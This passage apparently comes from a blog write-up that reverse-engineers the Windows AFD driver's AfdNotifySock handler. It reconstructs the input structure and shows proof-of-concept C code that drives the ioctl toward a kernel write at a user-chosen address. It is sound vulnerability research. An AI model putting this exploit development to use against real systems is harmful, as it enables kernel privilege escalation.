+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  Object <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>  status <span style="color:#f92672">=</span> ObReferenceObjectByHandle(firstItem, <span style="color:#ae81ff">2u</span>, v11, mode, <span style="color:#f92672">&amp;</span>Object, <span style="color:#ae81ff">0</span>i64);      <span style="color:#75715e">// 0x00 is HANDLE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  object <span style="color:#f92672">=</span> Object;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( status <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    is32 <span style="color:#f92672">=</span> IoIs32bitProcess(<span style="color:#ae81ff">0</span>i64);
+</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    MmUserProbeAddress_ <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#f92672">*</span>)MmUserProbeAddress;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( idx <span style="color:#f92672">&lt;</span> <span style="color:#f92672">*</span>((_DWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) )        <span style="color:#75715e">//  0x20 represents size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( mode )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        item <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>        nxtItem <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>        idx_1 <span style="color:#f92672">=</span> idx;
+</span></span><span style="display:flex;"><span>        List <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)AfdNotifyStruct <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>);      <span style="color:#75715e">//  AfdNotifyStruct + 0x08
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span> ( is32 )
+</span></span><span style="display:flex;"><span>        {   ...
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          v19 <span style="color:#f92672">=</span> (_BYTE <span style="color:#f92672">*</span>)(List <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>i64 <span style="color:#f92672">*</span> idx);         <span style="color:#75715e">// This loop traverses 0x08, assuming it is a list
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>          <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span>)v19 <span style="color:#f92672">&gt;=</span> <span style="color:#f92672">*</span>MmUserProbeAddress_ )
+</span></span><span style="display:flex;"><span>            v19 <span style="color:#f92672">=</span> (_BYTE <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>MmUserProbeAddress_;
+</span></span><span style="display:flex;"><span>          item <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)v19;
+</span></span><span style="display:flex;"><span>          nxtItem <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((_QWORD <span style="color:#f92672">*</span>)v19 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        itemAddr_1 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>item;
+</span></span><span style="display:flex;"><span>        itemAddr_2 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>item;
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> { ... }
+</span></span><span style="display:flex;"><span>      ...
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">++</span>idx;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> AfdNotifyRemoveIoCompletion(mode, (<span style="color:#66d9ef">__int64</span>)object, (_AFD_NOTIFYSOCK_STRUCT <span style="color:#f92672">*</span>)AfdNotifyStruct);
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>From this snippet, we refine the structure of <code>AFD_NOTIFYSOCK_STRUCT</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> {
+</span></span><span style="display:flex;"><span>    HANDLE          Handle;          <span style="color:#75715e">// 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID           List;            <span style="color:#75715e">// 0x08
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG       DATA1;           <span style="color:#75715e">// 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG       CONTROLDATA;     <span style="color:#75715e">// 0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD           Length;          <span style="color:#75715e">// 0x20
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD           DATA3;           <span style="color:#75715e">// 0x24
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG       DATA4;           <span style="color:#75715e">// 0x28
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>Additionally, the <code>Handle</code> field passed to <code>ObReferenceObjectByHandle</code> must return a non-negative status to continue execution down this branch.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">ObReferenceObjectByHandle</span>(
+</span></span><span style="display:flex;"><span>  [in]            HANDLE                     Handle,
+</span></span><span style="display:flex;"><span>  [in]            ACCESS_MASK                DesiredAccess,
+</span></span><span style="display:flex;"><span>  [in, optional]  POBJECT_TYPE               ObjectType,
+</span></span><span style="display:flex;"><span>  [in]            KPROCESSOR_MODE            AccessMode,
+</span></span><span style="display:flex;"><span>  [out]           PVOID                      <span style="color:#f92672">*</span>Object,
+</span></span><span style="display:flex;"><span>  [out, optional] POBJECT_HANDLE_INFORMATION HandleInformation
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>According to official documentation, <code>ObReferenceObjectByHandle</code> verifies access permission for an object handle. If access is granted, it stores the pointer to the object in <code>Object</code> and returns <code>STATUS_SUCCESS (0)</code>.</p>
+<p>When thinking of handles, my immediate thought was a file handle, so I decided to create a file handle and pass it in to test whether it works.</p>
+<p>At this stage, the execution path successfully reaches <code>AfdNotifyRemoveIoCompletion</code>. Removing dead branches and irrelevant logical flows yields the following clean representation of the function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">AfdNotifyRemoveIoCompletion</span>(<span style="color:#66d9ef">char</span> mode, <span style="color:#66d9ef">__int64</span> object, _AFD_NOTIFYSOCK_STRUCT <span style="color:#f92672">*</span>AfdNotifyStruct)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  v23 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>  memset(mem, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(mem));
+</span></span><span style="display:flex;"><span>  v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>i64;
+</span></span><span style="display:flex;"><span>  num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  data4 <span style="color:#f92672">=</span> LODWORD(AfdNotifyStruct<span style="color:#f92672">-&gt;</span>DATA4);
+</span></span><span style="display:flex;"><span>  mulResult <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span> <span style="color:#f92672">*</span> data4;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>...                                         <span style="color:#75715e">// Check that multiplication does not overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( notOverflow <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v10 <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>;
+</span></span><span style="display:flex;"><span>    ProbeForWrite(AfdNotifyStruct<span style="color:#f92672">-&gt;</span>DATA1, mulResult, v10);
+</span></span><span style="display:flex;"><span>    v19 <span style="color:#f92672">=</span> v5;
+</span></span><span style="display:flex;"><span>LABEL_20:
+</span></span><span style="display:flex;"><span>    data3 <span style="color:#f92672">=</span> AfdNotifyStruct<span style="color:#f92672">-&gt;</span>DATA3;
+</span></span><span style="display:flex;"><span>    v23 <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">10000</span> <span style="color:#f92672">*</span> data3;
+</span></span><span style="display:flex;"><span>    timeout <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v23;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( data4 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x10</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      mem_2 <span style="color:#f92672">=</span> ExAllocatePool2(<span style="color:#ae81ff">66</span>i64, <span style="color:#ae81ff">8</span>i64 <span style="color:#f92672">*</span> data4, <span style="color:#ae81ff">1315202625</span>i64);
+</span></span><span style="display:flex;"><span>      mem_1 <span style="color:#f92672">=</span> mem_2;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( mem_2 )
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_27;
+</span></span><span style="display:flex;"><span>      LODWORD(data4) <span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    mem_2 <span style="color:#f92672">=</span> mem;
+</span></span><span style="display:flex;"><span>    mem_1 <span style="color:#f92672">=</span> mem;
+</span></span><span style="display:flex;"><span>LABEL_27:
+</span></span><span style="display:flex;"><span>    notOverflow <span style="color:#f92672">=</span> IoRemoveIoCompletion(object_1, v5, mem_2, data4, <span style="color:#f92672">&amp;</span>num, mode, timeout, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>notOverflow )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( is32 )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> num; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>          v14 <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v5[<span style="color:#ae81ff">32</span> <span style="color:#f92672">*</span> i];
+</span></span><span style="display:flex;"><span>          v15 <span style="color:#f92672">=</span> (AfdNotifyStruct<span style="color:#f92672">-&gt;</span>DATA1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span>i64 <span style="color:#f92672">*</span> i);
+</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>v15 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>v14;
+</span></span><span style="display:flex;"><span>          v15[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(v14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>          v15[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(v14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>);
+</span></span><span style="display:flex;"><span>          v15[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(v14 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">*</span>AfdNotifyStruct<span style="color:#f92672">-&gt;</span>CONTROLDATA <span style="color:#f92672">=</span> num;            <span style="color:#75715e">// Vulnerability write trigger
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      ...
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  ...
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The logic multiplies <code>DATA4</code> by 32 and checks if the memory range starting at <code>DATA1</code> is writable using <code>ProbeForWrite</code>. Thus, <code>DATA1</code> represents a list, and <code>DATA4</code> indicates the number of elements in the list.</p>
+<p>Note the operation <code>LODWORD(AfdNotifyStruct-&gt;DATA4)</code>. Since <code>LODWORD</code> is used and <code>DATA4</code> represents the count of elements, our initial assumption regarding its length was incorrect. This field is actually a 4-byte (DWORD) field, not 8 bytes. Furthermore, by reviewing the decompiled output of <code>nt!IoRemoveIoCompletion</code> in IDA, we can confirm that <code>DATA3</code> relates to a timeout value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> {
+</span></span><span style="display:flex;"><span>    HANDLE      Handle;         <span style="color:#75715e">// 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID       List1;          <span style="color:#75715e">// 0x08
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID       List2;          <span style="color:#75715e">// 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG   CONTROLDATA;    <span style="color:#75715e">// 0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Length1;        <span style="color:#75715e">// 0x20  Controls loop iterations in AfdNotifySock
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Timeout;        <span style="color:#75715e">// 0x24
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Length2;        <span style="color:#75715e">// 0x28  Controls ProbeForWrite check range
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       UNKNOWNDATA;    <span style="color:#75715e">// 0x2c  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span></code></pre></div><p>To simplify execution, we can set both <code>Length1</code> and <code>Length2</code> to 1.</p>
+<p>Subsequently, <code>IoRemoveIoCompletion</code> is called, passing the object pointer retrieved from <code>ObReferenceObjectByHandle</code>. We must ensure that this call returns <code>STATUS_SUCCESS (0)</code>.</p>
+<p>This is where the obstacle lies. <code>IoRemoveIoCompletion</code> has no official documentation, and Windows Internals offers only brief explanations. I decided to write a quick test harness to explore this further:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;WS2_32.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> {
+</span></span><span style="display:flex;"><span>    HANDLE      Handle;         <span style="color:#75715e">// 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID       List1;          <span style="color:#75715e">// 0x08
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID       List2;          <span style="color:#75715e">// 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG   CONTROLDATA;    <span style="color:#75715e">// 0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Length1;        <span style="color:#75715e">// 0x20  Controls loop iterations in AfdNotifySock
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       DATA3;          <span style="color:#75715e">// 0x24
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Length2;        <span style="color:#75715e">// 0x28  Controls ProbeForWrite check range
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       UNKNOWNDATA;    <span style="color:#75715e">// 0x2c  
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> status <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> inbuf1 <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Start create handle</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    status <span style="color:#f92672">=</span> fopen_s((FILE<span style="color:#f92672">**</span>)(<span style="color:#f92672">&amp;</span>inbuf1.Handle), <span style="color:#e6db74">&#34;test.txt&#34;</span>, <span style="color:#e6db74">&#34;w&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (status) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;fopen_s error</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    inbuf1.List1 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    inbuf1.List2 <span style="color:#f92672">=</span> malloc(<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    inbuf1.CONTROLDATA <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4242</span>;
+</span></span><span style="display:flex;"><span>    inbuf1.Length1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>    inbuf1.DATA3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    inbuf1.Length2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WSADATA WSAData;
+</span></span><span style="display:flex;"><span>    SOCKET s;
+</span></span><span style="display:flex;"><span>    sockaddr_in sa;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> ierr;
+</span></span><span style="display:flex;"><span>    WSAStartup(<span style="color:#ae81ff">0x2</span>, <span style="color:#f92672">&amp;</span>WSAData);
+</span></span><span style="display:flex;"><span>    s <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+</span></span><span style="display:flex;"><span>    memset(<span style="color:#f92672">&amp;</span>sa, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>    sa.sin_port <span style="color:#f92672">=</span> htons(<span style="color:#ae81ff">135</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>);
+</span></span><span style="display:flex;"><span>    sa.sin_family <span style="color:#f92672">=</span> AF_INET;
+</span></span><span style="display:flex;"><span>    ierr <span style="color:#f92672">=</span> connect(s, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">sockaddr</span><span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sa, <span style="color:#66d9ef">sizeof</span>(sa));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    DeviceIoControl((HANDLE)s, <span style="color:#ae81ff">0X12127</span>, (LPVOID)<span style="color:#f92672">&amp;</span>inbuf1, <span style="color:#66d9ef">sizeof</span>(inbuf1), NULL, <span style="color:#ae81ff">0</span>, NULL, NULL);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The run failed with <code>ObReferenceObjectByHandle</code> returning <code>0xc0000008</code> (invalid handle). This confirmed that a standard file handle is insufficient. A detailed examination of <code>ObReferenceObjectByHandle</code> and <code>IoRemoveIoCompletion</code> is required.</p>
+<h3 id="52-obreferenceobjectbyhandle">5.2 ObReferenceObjectByHandle</h3>
+<p>While looking up information, I realized I did not examine the arguments of <code>ObReferenceObjectByHandle</code> in the decompiled code closely enough:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>v11 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">_OBJECT_TYPE</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">*</span>IoCompletionObjectType;
+</span></span><span style="display:flex;"><span>firstItem <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)AfdNotifyStruct;        <span style="color:#75715e">//  AfdNotifyStruct + 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>status <span style="color:#f92672">=</span> ObReferenceObjectByHandle(firstItem, <span style="color:#ae81ff">2u</span>, v11, mode, <span style="color:#f92672">&amp;</span>Object, <span style="color:#ae81ff">0</span>i64); 
+</span></span></code></pre></div><p>Notice the third argument: it explicitly specifies that <code>ObReferenceObjectByHandle</code> expects an object of type <code>IoCompletionObjectType</code>.</p>
+<p>In Chapter 8 of <em>Windows Internals, Sixth Edition</em>, there is a section dedicated to I/O Completion Ports (IOCP).</p>
+<p>I/O Completion Ports provide an efficient threading model that minimizes context switches while keeping threads active. Under this paradigm, a mechanism is needed to allow applications to wake up another thread when one thread processes an I/O operation.</p>
+<p>This introduces the <code>IoCompletion</code> executive object, represented as a completion port in the Windows API. It keeps track of the completion status of asynchronous I/O operations across multiple file handles. Once a file handle is associated with a completion port, any asynchronous I/O completion on it queues a completion packet to the port.</p>
+<p>Applications call the Windows API function <code>CreateIoCompletionPort</code> to create a completion port, which internally invokes the <code>NtCreateIoCompletion</code> system service.</p>
+<p>Thus, we can create an I/O Completion object via <code>CreateIoCompletionPort</code> and place its handle in the first field of <code>AFD_NOTIFYSOCK_STRUCT</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>HANDLE <span style="color:#a6e22e">CreateIoCompletionPort</span>(
+</span></span><span style="display:flex;"><span>  [in]           HANDLE    FileHandle,
+</span></span><span style="display:flex;"><span>  [in, optional] HANDLE    ExistingCompletionPort,
+</span></span><span style="display:flex;"><span>  [in]           ULONG_PTR CompletionKey,
+</span></span><span style="display:flex;"><span>  [in]           DWORD     NumberOfConcurrentThreads
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p>The final parameter <code>NumberOfConcurrentThreads</code> limits the maximum number of threads associated with the port that can run concurrently. A value of 0 tells the system to use the number of processors.</p>
+<p>Testing confirmed that using this handle makes <code>ObReferenceObjectByHandle</code> return <code>STATUS_SUCCESS (0)</code>.</p>
+<h3 id="53-ioremoveiocompletion">5.3 IoRemoveIoCompletion</h3>
+<p>As the name suggests, this function is also closely related to I/O completion. Understanding what this function does requires a grasp of how completion ports work.</p>
+<p><img src="/img/2023-04-03-14-56-10.png" alt=""></p>
+<p>According to <em>Windows Internals</em>, a completion port contains a kernel synchronization object called a kernel queue. The queue object has a concurrency value set at initialization time, which corresponds to the <code>NumberOfConcurrentThreads</code> argument supplied during the call to <code>CreateIoCompletionPort</code>. This controls the number of concurrent threads that can run for the completion port.</p>
+<p>When an application associates a file handle with a completion port using <code>CreateIoCompletionPort</code>, <code>NtSetInformationFile</code> is called to set the handle&rsquo;s <code>FileCompletionInformation</code>, which includes the completion port handle and the <code>CompletionKey</code> (used to distinguish between different files). During this process, <code>NtSetInformationFile</code> allocates a completion context data structure and sets the file object&rsquo;s <code>CompletionContext</code> field to point to it.</p>
+<p>Upon completion of an asynchronous I/O operation on a file object, the I/O manager checks the file object&rsquo;s <code>CompletionContext</code> field. If it is populated, the operation is managed via a completion port. The I/O manager then constructs a completion packet and inserts it into the kernel queue of the completion port.</p>
+<p>Threads associated with this completion port call <code>GetQueuedCompletionStatus</code> to monitor the queue for completion packets. This function attempts to dequeue a completion packet from the kernel queue. If the queue is empty, the thread goes into a wait state for a specified duration (timeout). The action of <strong>dequeuing a completion packet from the kernel queue</strong> is handled internally by <code>IoRemoveIoCompletion</code>.</p>
+<p>Therefore, for <code>IoRemoveIoCompletion</code> to execute successfully, we must ensure that the completion port&rsquo;s queue contains completion packets prior to the call.</p>
+<p><em>Windows Internals</em> notes that <code>PostQueuedCompletionStatus</code> queues a completion packet to a completion port by calling <code>KeInsertQueue</code> internally.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">PostQueuedCompletionStatus</span>(
+</span></span><span style="display:flex;"><span>  [in]           HANDLE       CompletionPort,
+</span></span><span style="display:flex;"><span>  [in]           DWORD        dwNumberOfBytesTransferred,
+</span></span><span style="display:flex;"><span>  [in]           ULONG_PTR    dwCompletionKey,
+</span></span><span style="display:flex;"><span>  [in, optional] LPOVERLAPPED lpOverlapped
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><h3 id="54-another-attempt">5.4 Another Attempt</h3>
+<p>The revised PoC code is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">#define _CRT_SECURE_NO_DEPRECATE
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;WS2_32.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">AFD_NOTIFYSOCK_STRUCT</span> {
+</span></span><span style="display:flex;"><span>    HANDLE      Handle;         <span style="color:#75715e">// 0x00
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID       List1;          <span style="color:#75715e">// 0x08
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PVOID       List2;          <span style="color:#75715e">// 0x10
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    ULONGLONG   CONTROLDATA;    <span style="color:#75715e">// 0x18
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Length1;        <span style="color:#75715e">// 0x20  Controls loop iterations in AfdNotifySock
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       DATA3;          <span style="color:#75715e">// 0x24
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       Length2;        <span style="color:#75715e">// 0x28  Controls ProbeForWrite check range
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    DWORD       UNKNOWNDATA;    <span style="color:#75715e">// 0x2c  
